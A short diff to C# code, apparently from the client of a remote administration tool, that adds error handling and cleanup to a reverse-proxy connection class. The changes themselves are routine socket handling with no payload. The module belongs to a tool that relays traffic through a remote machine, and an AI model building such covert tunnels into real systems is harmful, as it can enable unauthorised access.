@@ -41,8 +41,16 @@ namespace xClient.Core.ReverseProxy
 
             if (this.Handle.Connected)
             {
-                this.Buffer = new byte[BUFFER_SIZE];
-                this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                try
+                {
+                    this.Buffer = new byte[BUFFER_SIZE];
+                    this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                }
+                catch
+                {
+                    new ReverseProxy_ConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
+                    Disconnect();
+                }
 
                 IPEndPoint LocalEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
                 new ReverseProxy_ConnectResponse(ConnectionId, true, LocalEndPoint.Address.Address, LocalEndPoint.Port).Execute(Client);
@@ -102,6 +110,8 @@ namespace xClient.Core.ReverseProxy
                 Handle.Close();
             }
             catch { }
+
+            Client.RemoveProxyClient(this.ConnectionId);
         }
 
         public void SendToTargetServer(byte[] Data)
